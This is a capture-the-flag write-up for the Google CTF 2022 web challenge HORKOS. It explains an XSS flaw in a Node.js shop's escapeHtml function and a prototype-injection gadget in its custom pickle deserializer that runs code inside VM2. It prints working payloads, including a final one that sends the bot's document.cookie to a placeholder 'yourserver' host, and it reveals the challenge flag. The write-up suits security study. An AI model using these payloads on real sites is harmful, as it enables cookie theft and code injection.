---
layout: page
title: Google CTF 2022 - HORKOS
nav_order: 1
parent: 2022
permalink: /2022/google-ctf-2022-horkos
---

<style type="text/css">
@font-face {
    font-family: 'danielbd';
    src: url('/assets/fonts/danielbd.woff2') format('woff2');
}
</style>

# Google CTF 2022 - HORKOS
{: .fs-9}

- [x] Web
- [x] Eat your vegetables
- [x] [Attachment](/assets/attachment/e4837279de4f37babd32001585aacfa93f1d40f3b37ea31e2528cbd12ccc28725cd823f9b20d66f532df2af01d349f71ab5c38598dd3d62da49bd448eabdc44a.zip)
{: .fs-6 .fw-300 }

[Get started now](#getting-started){: .btn .btn-primary .fs-5 .mb-4 .mb-md-0 .mr-2 }
[View it on GitHub](https://github.com/ks75vl/ks75vl.github.io/blob/main/docs/2022/Google%20CTF%202022%20-%20HORKOS.md){: .btn .fs-5 .mb-4 .mb-md-0 }

---

## Getting started
### Sumary

We are given a zip file, which contains the source code of a web server written in Node.js. The server is an online vegetable shopping website, you can choose the vegetables and checkout. The order will be sent to the shipper via a bot. That leads us to assume that this is some kind of XSS challenge.

### Source code analysis

<svg xmlns="http://www.w3.org/2000/svg" width="577" height="307" xmlns:xlink="http://www.w3.org/1999/xlink"><source><![CDATA[Browser->Node.js: cart
Node.js->Bot: order
Node.js->Browser: order
Note right of Bot: Exchange data is pickled]]></source><desc></desc><defs><marker viewBox="0 0 5 5" markerWidth="5" markerHeight="5" orient="auto" refX="5" refY="2.5" id="markerArrowBlock"><path d="M 0 0 L 5 2.5 L 0 5 z"></path></marker><marker viewBox="0 0 9.6 16" markerWidth="4" markerHeight="16" orient="auto" refX="9.6" refY="8" id="markerArrowOpen"><path d="M 9.6,8 1.92,16 0,13.7 5.76,8 0,2.286 1.92,0 9.6,8 z"></path></marker></defs><g class="title"></g><g class="actor"><path d="M10,20C85.3,16.0 93.2,24.0 109.0,20.0C110.7,40.1 107.3,44.9 109.0,62.4C85.3,66.4 33.8,58.4 10.0,62.4C8.3,45.3 11.7,26.8 10.0,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="20.80000001192093" y="46.39999961853027" style="font-size: 16px; font-family: danielbd;"><tspan x="20">Browser</tspan></text></g><g class="actor"><path d="M10,245.2000026702881C56.0,241.2 25.8,249.2 109.0,245.2C110.7,252.0 107.3,257.4 109.0,287.6C68.1,291.6 93.2,283.6 10.0,287.6C11.7,261.8 8.3,269.3 10.0,245.2" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="20.80000001192093" y="271.60000228881836" style="font-size: 16px; font-family: danielbd;"><tspan x="20">Browser</tspan></text></g><path d="M59.5,62.4C52.2,213.9 66.8,190.8 59.5,245.2" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="actor"><path d="M129.03125,20C142.3,23.2 196.2,16.8 209.0,20.0C207.3,52.2 210.7,46.3 209.0,62.4C141.8,65.6 148.2,59.2 129.0,62.4C130.7,47.6 127.3,53.8 129.0,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="139.03125" y="43.60000038146973" style="font-size: 16px; font-family: danielbd;"><tspan x="139.03125">Node.js</tspan></text></g><g class="actor"><path d="M129.03125,245.2000026702881C145.4,242.0 153.7,248.4 209.0,245.2C210.7,276.1 207.3,255.4 209.0,287.6C148.2,290.8 169.2,284.4 129.0,287.6C130.7,277.4 127.3,255.4 129.0,245.2" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="139.03125" y="268.8000030517578" style="font-size: 16px; font-family: danielbd;"><tspan x="139.03125">Node.js</tspan></text></g><path d="M169.0,62.4C161.7,91.6 176.3,106.3 169.0,245.2" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="actor"><path d="M229.03125,20C272.2,17.7 277.0,22.3 286.1,20.0C284.4,55.6 287.8,52.2 286.1,62.4C238.2,64.7 242.7,60.1 229.0,62.4C230.7,38.9 227.3,55.6 229.0,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="239.83125001192093" y="46.39999961853027" style="font-size: 16px; font-family: danielbd;"><tspan x="239.03125">Bot</tspan></text></g><g class="actor"><path d="M229.03125,245.2000026702881C242.7,247.5 244.0,242.9 286.1,245.2C284.4,255.4 287.8,260.0 286.1,287.6C244.9,285.3 266.3,289.9 229.0,287.6C227.3,252.0 230.7,267.4 229.0,245.2" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="239.83125001192093" y="271.60000228881836" style="font-size: 16px; font-family: danielbd;"><tspan x="239.03125">Bot</tspan></text></g><path d="M257.6,62.4C264.9,216.0 250.3,201.3 257.6,245.2" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="signal"><text x="95.28437423706055" y="92.19999980926514" style="font-size: 16px; font-family: danielbd;"><tspan x="95.28437423706055">cart</tspan></text><path d="M59.5,98.4C99.8,94.0 103.7,102.8 169.0,98.4" stroke="#000000" fill="none" style="stroke-width: 2; marker-end: url(&quot;#markerArrowBlock&quot;);"></path></g><g class="signal"><text x="187.80156230926514" y="128.5999994277954" style="font-size: 16px; font-family: danielbd;"><tspan x="187.80156230926514">order</tspan></text><path d="M169.0,135.2C238.9,131.7 211.6,138.7 257.6,135.2" stroke="#000000" fill="none" style="stroke-width: 2; marker-end: url(&quot;#markerArrowBlock&quot;);"></path></g><g class="signal"><text x="88.77109336853027" y="165.4000005722046" style="font-size: 16px; font-family: danielbd;"><tspan x="88.77109336853027">order</tspan></text><path d="M169.0,172.0C151.5,167.6 89.3,176.4 59.5,172.0" stroke="#000000" fill="none" style="stroke-width: 2; marker-end: url(&quot;#markerArrowBlock&quot;);"></path></g><g class="note"><path d="M277.5765628814697,192.00000190734863C363.0,200.9 370.2,183.1 499.3,192.0C498.0,203.9 500.6,217.2 499.3,225.2C326.9,234.1 330.8,216.3 277.6,225.2C276.2,215.3 278.9,213.8 277.6,192.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="282.5765628814697" y="211.40000247955322" style="font-size: 16px; font-family: danielbd;"><tspan x="282.5765628814697">Exchange data is pickled</tspan></text></g></svg>

According to the source code, both client and server share the same javascript module `*shoplib.mjs*`,
one runs in node.js, one runs in web browser.
The intermediate data passed between server and client are linked by pickle method.

As I mentioned above, this can be an XSS challenge.
Based on Fig.1 we can find the attack vector by finding the connection between sink and source.
The Sink is the bot, or in other words, the bot's browser context.
Source is our browser.

<svg xmlns="http://www.w3.org/2000/svg" width="427" height="351" xmlns:xlink="http://www.w3.org/1999/xlink"><source><![CDATA[Browser->VM2: cart
Note left of Browser: Source
Note over VM2: shoplib.mjs
VM2->Bot: order
Note right of Bot: Sink]]></source><desc></desc><defs><marker viewBox="0 0 5 5" markerWidth="5" markerHeight="5" orient="auto" refX="5" refY="2.5" id="markerArrowBlock"><path d="M 0 0 L 5 2.5 L 0 5 z"></path></marker><marker viewBox="0 0 9.6 16" markerWidth="4" markerHeight="16" orient="auto" refX="9.6" refY="8" id="markerArrowOpen"><path d="M 9.6,8 1.92,16 0,13.7 5.76,8 0,2.286 1.92,0 9.6,8 z"></path></marker></defs><g class="title"></g><g class="actor"><path d="M59.12187576293945,20C116.1,24.0 131.9,16.0 158.2,20.0C159.6,35.8 156.7,32.8 158.2,56.8C92.5,60.8 82.9,52.8 59.1,56.8C60.6,50.9 57.6,42.1 59.1,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="69.92187577486038" y="43.60000038146973" style="font-size: 16px; font-family: danielbd;"><tspan x="69.12187576293945">Browser</tspan></text></g><g class="actor"><path d="M59.12187576293945,294.8000030517578C142.3,290.8 134.4,298.8 158.2,294.8C156.7,310.5 159.6,317.8 158.2,331.6C91.9,335.6 114.8,327.6 59.1,331.6C57.6,319.2 60.6,308.5 59.1,294.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="69.92187577486038" y="318.40000343322754" style="font-size: 16px; font-family: danielbd;"><tspan x="69.12187576293945">Browser</tspan></text></g><path d="M108.6,56.8C99.1,129.2 118.2,232.4 108.6,294.8" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="actor"><path d="M178.15312576293945,20C200.6,17.7 222.0,22.3 235.8,20.0C237.3,34.6 234.4,28.8 235.8,56.8C201.3,59.1 212.8,54.5 178.2,56.8C176.7,32.1 179.6,44.4 178.2,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="188.15312576293945" y="43.60000038146973" style="font-size: 16px; font-family: danielbd;"><tspan x="188.15312576293945">VM2</tspan></text></g><g class="actor"><path d="M178.15312576293945,294.8000030517578C194.3,297.1 194.6,292.5 235.8,294.8C237.3,304.2 234.4,322.7 235.8,331.6C224.1,329.3 219.0,333.9 178.2,331.6C179.6,314.8 176.7,308.1 178.2,294.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="188.15312576293945" y="318.40000343322754" style="font-size: 16px; font-family: danielbd;"><tspan x="188.15312576293945">VM2</tspan></text></g><path d="M207.0,56.8C216.5,113.9 197.5,94.9 207.0,294.8" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="actor"><path d="M255.84062576293945,20C292.6,17.7 295.6,22.3 312.9,20.0C311.5,48.7 314.4,39.4 312.9,56.8C286.2,59.1 285.5,54.5 255.8,56.8C254.4,26.7 257.3,31.1 255.8,20.0" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="266.6406257748604" y="43.60000038146973" style="font-size: 16px; font-family: danielbd;"><tspan x="265.84062576293945">Bot</tspan></text></g><g class="actor"><path d="M255.84062576293945,294.8000030517578C277.9,292.5 280.9,297.1 312.9,294.8C314.4,303.6 311.5,300.7 312.9,331.6C269.5,329.3 270.0,333.9 255.8,331.6C257.3,325.7 254.4,319.4 255.8,294.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="266.6406257748604" y="318.40000343322754" style="font-size: 16px; font-family: danielbd;"><tspan x="265.84062576293945">Bot</tspan></text></g><path d="M284.4,56.8C293.9,231.2 274.9,237.7 284.4,294.8" stroke="#000000" fill="none" style="stroke-width: 2;"></path><g class="signal"><text x="138.828125" y="86.60000133514404" style="font-size: 16px; font-family: danielbd;"><tspan x="138.828125">cart</tspan></text><path d="M108.6,92.8C147.5,88.9 124.4,96.7 207.0,92.8" stroke="#000000" fill="none" style="stroke-width: 2; marker-end: url(&quot;#markerArrowBlock&quot;);"></path></g><g class="note"><path d="M20,112.80000114440918C69.2,115.5 62.0,110.1 88.6,112.8C87.6,119.0 89.7,117.0 88.6,138.8C77.7,136.1 40.7,141.5 20.0,138.8C21.0,119.0 19.0,123.6 20.0,112.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="25.80000001192093" y="130.60000133514404" style="font-size: 16px; font-family: danielbd;"><tspan x="25">Source</tspan></text></g><g class="note"><path d="M156.359375,158.80000114440918C213.9,162.9 233.3,154.7 257.6,158.8C259.0,184.0 256.3,168.6 257.6,192.0C219.5,187.9 188.4,196.1 156.4,192.0C157.7,186.7 155.0,183.5 156.4,158.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="161.359375" y="178.20000171661377" style="font-size: 16px; font-family: danielbd;"><tspan x="161.359375">shoplib.mjs</tspan></text></g><g class="signal"><text x="220.1890630722046" y="222.20000171661377" style="font-size: 16px; font-family: danielbd;"><tspan x="220.1890630722046">order</tspan></text><path d="M207.0,228.8C268.5,231.9 219.4,225.7 284.4,228.8" stroke="#000000" fill="none" style="stroke-width: 2; marker-end: url(&quot;#markerArrowBlock&quot;);"></path></g><g class="note"><path d="M304.3859386444092,248.8000030517578C338.3,250.6 315.1,247.0 349.0,248.8C350.1,270.6 348.0,268.6 349.0,274.8C326.2,276.6 317.7,273.0 304.4,274.8C303.3,254.8 305.4,267.5 304.4,248.8" stroke="#000000" fill="#ffffff" style="stroke-width: 2;"></path><text x="310.1859386563301" y="266.6000032424927" style="font-size: 16px; font-family: danielbd;"><tspan x="309.3859386444092">Sink</tspan></text></g></svg>

## Sink
### Analysis
We'll start with the sink, the bot will load the order page, which is the `/order` path with a hash at the end.
The hash part will be base64 and json decoded, then passed to the `DeliveryClient` class.
The results is accumulated into the `innerHTML` of the `div` tag with the id of `order`, here we can smell the rich flavor of XSS. 凸(￣0￣)凸

The `DeliveryClient` class will render `orders` using template.

{% highlight js linenos %}
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
const renderLines = (arr) => arr.reduce((p,c) => p+`
<div class="row">
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'quantity').toString())}
  </p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'price').toString())}
  </p>
</div>
<hr>
</div>`, '');

const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a);

const renderOrder = (arr) => {
    return `
    <div class="container">
      <p class="my-5 mx-5" style="font-size: 30px;">Delivery Information</p>
      <div class="row">
        <ul class="list-unstyled">
          <li class="text-black">${escapeHtml(getValue(arr,'cart/address/street').toString())} ${escapeHtml(getValue(arr,'cart/address/number').toString())}</li>
          <li class="text-muted mt-1"><span class="text-black">Invoice</span> #${escapeHtml(getValue(arr, 'orderId').toString())}</li>
          <li class="text-black mt-1">${new Date().toDateString()}</li>
        </ul>
        <hr>
      </div>
      
      ${renderLines(getValue(arr, 'cart/items'))}

      <div class="row text-black">
        <div class="col-xl-12">
          <p class="float-end fw-bold">Total: $1337
          </p>
        </div>
        <hr style="border: 2px solid black;">
      </div>
      <div class="text-center" style="margin-top: 90px;">
        <p>Delivered by ${escapeHtml(getValue(arr, 'driver/username').toString())}. </p>
      </div>

    </div>
`;    
};
{% endhighlight %}

If we notice, the data used to render is extracted from `orders` via the `getValue` function.
Before being embedded into the template using template literal, it is not surprising that it is passed into the `escapeHtml` function, which is a function used to escape the `<` character.

Feeling bad, because the character `<` is an indispensable character to perform XSS. 凸(￣﹏￣)凸

But wait, there's a black sheep in the family. (͡ ° ͜ʖ ͡ °)

### The Black Sheep of the Family

{% highlight js linenos %}
const renderLines = (arr) => arr.reduce((p,c) => p+`
<div class="row">
<div class="col-xl-8">
  <p>${ /** ---------> */  escapeHtml(c.key).toString()  /** <--------- */ }</p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'quantity').toString())}
  </p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'price').toString())}
  </p>
</div>
<hr>
</div>`, '');
{% endhighlight %}

There seems to be a mistake.
`escapeHtml(something.toString())` is different from `escapeHtml(something).toString()`, the last one will probably lead to abnormal behavior of the function `escapeHtml`.

Take a look at the function `escapeHtml`, which replaces the `<` character with `&#60;`, with the `/g` flag enabled all `<` characters will be replaced, this is a simple but effective way to prevent XSS. But this is only true for `string` input, if input is an array nothing will be replaced. Because the includes method of an Array instance only returns true when there is a matching element, not a character.

Going back to the function `escapeHtml`, all input data is converted to a string through the function `toString` except one (highlighted above). (͡ ° ͜ʖ ͡ °)

```
https://horkos-web.2022.ctfcompetition.com/order#W1t7ImtleSI6ImNhcnQiLCJ0eXBlIjoicGlja2xlZFNob3BwaW5nQ2FydCIsInZhbHVlIjpbeyJrZXkiOiJpdGVtcyIsInR5cGUiOiJwaWNrbGVkT2JqZWN0IiwidmFsdWUiOlt7ImtleSI6WyI8aW1nIHNyYz14IG9uZXJyb3I9J2FsZXJ0KDEpOyc+PC9pbWc+Il0sInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NDR9LHsia2V5IjoicXVhbnRpdHkiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiIwIn1dfV19LHsia2V5IjoiYWRkcmVzcyIsInR5cGUiOiJwaWNrbGVkQWRkcmVzcyIsInZhbHVlIjpbeyJrZXkiOiJzdHJlZXQiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiIifSx7ImtleSI6Im51bWJlciIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6MH0seyJrZXkiOiJ6aXAiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjB9XX0seyJrZXkiOiJzaG9wcGluZ0NhcnRJZCIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NjQ3Njg3ODM5NTM3fV19LHsia2V5IjoiZHJpdmVyIiwidHlwZSI6InBpY2tsZWREcml2ZXIiLCJ2YWx1ZSI6W3sia2V5IjoidXNlcm5hbWUiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiJkcml2ZWZhc3QxIn0seyJrZXkiOiJvcmRlcnMiLCJ0eXBlIjoicGlja2xlZEFycmF5IiwidmFsdWUiOltdfV19LHsia2V5Ijoib3JkZXJJZCIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NjQ3Njg3ODM5NTM3fV1d
```

{% highlight json linenos %}
[
    [
        {
            "key": "cart",
            "type": "pickledShoppingCart",
            "value": [
                {
                    "key": "items",
                    "type": "pickledObject",
                    "value": [
                        {
                            "key": ["<img src=x onerror='alert(1);'></img>"],
                            "type": "pickledItem",
                            "value": [
                                {"key": "price", "type": "Number", "value": 44},
                                {"key": "quantity", "type": "String", "value": "0"}
                            ]
                        }
                    ]
                },
....
{% endhighlight %}

Booom XSS alert . ¬(^∀ ^ )

## Source
### Analysis

From our browser, after selecting vegetables and checkout, the cart before sending to the server will be pickled using the method `pickle.dumps`.

Take a look at the pickle methods

{% highlight javascript linenos %}
export const pickle = {
    PRIMITIVES: ['String', 'Number', 'Boolean'],
    loads: json => {
        const obj = {};
        for (const {key, type, value} of json) {
            if (type.match(/^pickled/)) {
                obj[key] = pickle.loads(value);
                const constructor = type.replace(/^pickled/, '');
                obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
            } else {
                obj[key] = new globalThis[type](value);
            }
        }
        return obj;
    },
    dumps: obj => {
        const json = [];
        for (const key in obj) {
            const value = obj[key];
            const type = value.constructor.name;
            if (typeof type !== 'string') continue;
            if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
                json.push({
                    key,
                    type: 'pickled' + type,
                    value: pickle.dumps(value)
                });
            } else if (typeof value !== 'undefined') {
                json.push({
                    key,
                    type,
                    value: globalThis[type].prototype.valueOf.call(value)
                });
            }
        }
        return json;
    }
};
{% endhighlight %}

The critical part is in the `loads` function where the pickled data is converted to its original class.

{% highlight javascript linenos %}
if (type.match(/^pickled/)) {
    obj[key] = pickle.loads(value);
    const constructor = type.replace(/^pickled/, '');
    obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
} else {
    obj[key] = new globalThis[type](value);
}
{% endhighlight %}

According to the way loads function is implemented, some unexpected behavior occurs:
- [x] Object instance can be different from object type (prototype). --> `factor 1`
- [x] Construction any kind of object. --> `factor 2`


One more thing
{% highlight javascript linenos %}
let result = await vm.run(script);
                            ^
                            return sendOrder(cart, orders); // VM2 return the completion value.
                            ^
                            return delivery.sendOrder();
                            ^
                            return this.order.orderId;
{% endhighlight %}
According to the above reference diagram, if `orderId` is `Promise/Thenable` then abnormal behavior will occur --> `factor 3`

### RCE

Linking the above 3 factors we can execute remote code (aka RCE) inside VM2, that is just enough for us to be able to control `orders` as we want, that is the missing link between `source` and `sink`. ¬(^∀ ^ )

{% highlight javascript linenos %}
[
    {
        "key": "0",
        "type": "pickledShoppingCart",
        "value": [
            {...},
            {...},
            {
                "key": "shoppingCartId",
                "type": "pickledPromise",
                "value": [
                    {
                        "key": "then",
                        "type": "Function",
                        "value": "orders[0][0].value[0].value[0].key=`RCE`;arguments[0]();"
                    }
                ]
            }
...
{% endhighlight %}

This is how the above payload works
- Using `factor 2` to create an object with `type Function` and `value is the function body`.
- Using `factor 1` to create an object with `prototype of Promise` and has a key named `then` with type `Function` (aka thenable object).
- Using `factor 3` to invoke thenable object create above.

{% highlight javascript linenos %}
...
// Pseudocode will be run in VM2 for above payload.
let func = new Function('orders[0][0].value[0].value[0].key=`RCE`;arguments[0]();');
let orderId = { then: func };
let result = await orderId;
...
{% endhighlight %}

## Capture the flag

Now that we have `sink` and `source` and the link between them, a complete payload to trigger XSS can be crafted. (˶¯◡¯) (˶¯◡¯)

{% highlight javascript linenos %}
[
    {
        "key": "0",
        "type": "pickledShoppingCart",
        "value": [
            {...},
            {...},
            {
                "key": "shoppingCartId",
                "type": "pickledPromise",
                "value": [
                    {
                        "key": "then",
                        "type": "Function",
                        "value": "orders[0][0].value[0].value[0].key=[`<img src=x onerror='window.location.href=\\`http://yourserver/?c=\\`.concat(btoa(document.cookie));'></img>`];arguments[0]();"
                    }
                ]
            }
        ]
    }
]
{% endhighlight %}

- [x] `CTF{069e52c1198b34f94c0d67aefc7e3527}`

Captured
{: .label .label-green }